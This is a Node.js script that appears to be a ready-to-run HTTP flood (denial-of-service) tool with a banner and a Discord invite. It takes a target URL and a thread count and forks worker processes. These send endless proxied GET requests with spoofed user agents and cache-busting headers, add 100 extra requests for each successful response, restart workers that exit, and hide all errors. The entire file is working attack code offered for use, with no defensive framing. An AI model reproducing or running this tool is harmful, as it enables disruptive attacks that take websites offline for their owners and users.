require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request'),
      axios = require("axios"),
      fs = require('fs'),
	  fakeUa = require('fake-useragent'),
      cluster = require('cluster'),
      path = require("path");
async function main_process() {
	if (process.argv.length !== 4) {
		console.clear();
		console.log(`\x1b[31m
██████╗░███████╗██████╗░░██████╗████████╗░█████╗░██████╗░
██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
██████╔╝█████╗░░██║░░██║╚█████╗░░░░██║░░░███████║██████╔╝
██╔══██╗██╔══╝░░██║░░██║░╚═══██╗░░░██║░░░██╔══██║██╔══██╗
██║░░██║███████╗██████╔╝██████╔╝░░░██║░░░██║░░██║██║░░██║
╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝
      [+] \x1b[36mhttps://discord.gg/XyJG87495q
		`);
		console.log(`\x1b[32mUsage: node ${path.basename(__filename)} <URL> <THREADS>`);
		console.log(`Example: node ${path.basename(__filename)} http://example.com/ 1000\x1b[00m`);
		console.log();
    }else{
        const target = process.argv[2];
        const threads = process.argv[3];
        Array.prototype.remove_by_value = function(val) {
            for (var i = 0; i < this.length; i++) {
            if (this[i] === val) {
                this.splice(i, 1);
                i--;
            }
            }
            return this;
        }
        console.log("ATTACK HTTP_PROXY")
        var proxies = fs.readFileSync("proxies.txt", 'utf-8').replace(/\r/g, '').split('\n'); 
        function run() {
            var proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var proxiedRequest = request.defaults({'proxy': 'http://'+proxy});
            var config = {
                method: 'get',
                url: target,
                headers: {
                    'Cache-Control': 'no-cache',
                    'User-Agent': fakeUa()
                }
            };
            proxiedRequest(config, function (error, response) {
                console.log(response.statusCode,"HTTP_PROXY");
                if (proxies.length == 0) {
                    process.exit(0);
                }
                if (response.statusCode >= 200 && response.statusCode <= 226) {
                    for (let index = 0; index < 100; index++) {
                        proxiedRequest(config);
                    }
                }else{
                    proxies = proxies.remove_by_value(proxy)
                }
            });
        }
        function thread(){
            setInterval(() => {
                run();
            });
        }
        async function main(){
                if (cluster.isMaster) {
                        for (let i = 0; i < threads; i++) {
                            cluster.fork();
                            console.log(`TREADS: ${i+1}`);
                        }
                    cluster.on('exit', function(){
                        cluster.fork();
                    });
                } else {
                    thread();
                }
        }
        main();
        setTimeout(() => {
        console.log('Attack End');
        process.exit(0)
        },60 * 1000);
    }
}
process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});
main_process();
